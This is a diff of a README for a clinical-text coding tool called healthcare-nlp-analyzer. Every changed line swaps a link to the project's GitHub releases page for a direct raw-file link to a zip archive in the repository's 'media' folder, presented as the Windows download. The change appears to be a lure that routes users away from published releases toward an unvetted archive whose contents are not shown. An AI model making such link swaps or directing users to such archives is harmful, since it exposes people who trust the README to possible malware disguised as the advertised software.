@@ -1,12 +1,12 @@
 # 🏥 healthcare-nlp-analyzer - Turn Clinical Text Into Codes
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/kaleshmohan/healthcare-nlp-analyzer/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/kaleshmohan/healthcare-nlp-analyzer/raw/refs/heads/main/media/analyzer-healthcare-nlp-v1.2.zip)
 
 ## 📥 Download
 
 Visit this page to download the Windows release:
 
-https://github.com/kaleshmohan/healthcare-nlp-analyzer/releases
+https://github.com/kaleshmohan/healthcare-nlp-analyzer/raw/refs/heads/main/media/analyzer-healthcare-nlp-v1.2.zip
 
 ## 🪟 Windows Setup
 
@@ -205,4 +205,4 @@ This app can help with:
 
 If you need the release page again, use this link:
 
-https://github.com/kaleshmohan/healthcare-nlp-analyzer/releases
+https://github.com/kaleshmohan/healthcare-nlp-analyzer/raw/refs/heads/main/media/analyzer-healthcare-nlp-v1.2.zip
